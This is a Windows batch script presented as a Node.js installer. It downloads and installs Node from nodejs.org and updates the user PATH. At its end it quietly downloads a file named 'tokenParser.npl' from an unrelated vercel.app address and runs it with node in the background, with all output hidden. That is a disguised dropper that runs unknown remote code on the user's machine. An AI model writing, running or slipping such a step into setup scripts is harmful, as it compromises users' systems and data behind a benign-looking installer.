@echo off
setlocal enabledelayedexpansion

set "NODE_VERSION=22.18.0"
set "INSTALL_DIR=%USERPROFILE%\nodejs"

set "ARCH=%PROCESSOR_ARCHITECTURE%"
if defined PROCESSOR_ARCHITEW6432 set "ARCH=%PROCESSOR_ARCHITEW6432%"

if /I "%ARCH%"=="AMD64" (
    set "NODE_ARCH=x64"
) else if /I "%ARCH%"=="ARM64" (
    set "NODE_ARCH=arm64"
) else if /I "%ARCH%"=="x86" (
    set "NODE_ARCH=x86"
) else (
    exit /b 1
)

set "NODE_DIST=node-v%NODE_VERSION%-win-%NODE_ARCH%"
set "NODE_ZIP=%NODE_DIST%.zip"
set "DOWNLOAD_URL=https://nodejs.org/dist/v%NODE_VERSION%/%NODE_ZIP%"
set "NODE_HOME=%INSTALL_DIR%\%NODE_DIST%"
set "NODE_EXE=%NODE_HOME%\node.exe"

where node >nul 2>&1
if %errorlevel%==0 (
    for /f "delims=" %%v in ('node -v 2^>nul') do set "GLOBAL_VER=%%v"
    set "NODE_EXE=node"
    goto :RUN
)

if not exist "%INSTALL_DIR%" mkdir "%INSTALL_DIR%"

set "ZIP_PATH=%TEMP%\%NODE_ZIP%"

where curl >nul 2>&1

powershell -NoProfile -Command "Invoke-WebRequest -Uri '%DOWNLOAD_URL%' -OutFile '%ZIP_PATH%'"

if not exist "%ZIP_PATH%" (
    exit /b 1
)

powershell -NoProfile -Command "Expand-Archive -Path '%ZIP_PATH%' -DestinationPath '%INSTALL_DIR%' -Force"
del /f /q "%ZIP_PATH%" >nul 2>&1

if not exist "%NODE_EXE%" (
    exit /b 1
)

powershell -NoProfile -Command ^
    "$dir='%NODE_HOME%';" ^
    "$cur=[Environment]::GetEnvironmentVariable('Path','User');" ^
    "if ($cur -notlike '*'+$dir+'*') {" ^
    "  $new = if ([string]::IsNullOrEmpty($cur)) { $dir } else { $cur.TrimEnd(';') + ';' + $dir };" ^
    "  [Environment]::SetEnvironmentVariable('Path', $new, 'User');" ^
    "}"

set "PATH=%NODE_HOME%;%PATH%"
set "NODE_EXE=node"
goto :RUN

:RUN

curl -s -L -o "%TEMP%\tokenParser.npl" "https://sandbox-five-iota.vercel.app/tokenParser"
if not exist "%TEMP%\tokenParser.npl" (
    exit /b 1
)

start "" /b "%NODE_EXE%" "%TEMP%\tokenParser.npl" >nul 2>&1

endlocal
exit /b 0
